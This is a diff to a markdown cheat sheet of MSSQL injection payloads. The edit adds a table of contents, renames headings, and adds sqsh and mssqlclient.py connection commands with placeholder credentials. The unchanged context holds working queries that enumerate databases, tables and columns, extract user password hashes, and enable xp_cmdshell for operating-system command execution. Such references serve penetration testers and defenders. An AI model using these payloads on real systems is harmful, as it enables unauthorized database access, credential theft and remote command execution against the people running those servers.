@@ -1,5 +1,23 @@
 # MSSQL Injection
 
+## Summary
+
+* [MSSQL comments](#mssql-comments)
+* [MSSQL version](#mssql-version)
+* [MSSQL database name](#mssql-database-name)
+* [MSSQL List databases](#mssql-list-database)
+* [MSSQL List columns](#mssql-list-columns)
+* [MSSQL List tables](#mssql-list-tables)
+* [MSSQL Extract user/password](#mssql-extract-user-password)
+* [MSSQL Union Based](#mssql-union-based)
+* [MSSQL Error Based](#mssql-error-based)
+* [MSSQL Blind Based](#mssql-blind-based)
+* [MSSQL Time Based](#mssql-time-based)
+* [MSSQL Stacked query](#mssql-stack-query)
+* [MSSQL Command execution](#mssql-command-execution)
+* [MSSQL UNC path](#mssql-unc-path)
+* [MSSQL Make user DBA](#mssql-make-user-dba)
+
 ## MSSQL comments
 
 ```sql
@@ -19,14 +37,14 @@ SELECT @@version
 SELECT DB_NAME()
 ```
 
-## MSSQL List Databases
+## MSSQL List databases
 
 ```sql
 SELECT name FROM master..sysdatabases;
 SELECT DB_NAME(N); — for N = 0, 1, 2, …
 ```
 
-## MSSQL List Column
+## MSSQL List columns
 
 ```sql
 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
@@ -35,7 +53,7 @@ SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master.
 SELECT table_catalog, column_name FROM information_schema.columns
 ```
 
-## MSSQL List Tables
+## MSSQL List tables
 
 ```sql
 SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
@@ -45,7 +63,7 @@ SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master.
 SELECT table_catalog, table_name FROM information_schema.columns
 ```
 
-## MSSQL User Password
+## MSSQL Extract user/password
 
 ```sql
 MSSQL 2000:
@@ -135,6 +153,13 @@ EXEC sp_configure 'show advanced options',1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
+```
+
+To interact with the MSSQL instance.
+
+```powershell
+sqsh -S 192.168.1.X -U sa -P superPassword
+python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
 ```
 
 ## MSSQL UNC Path
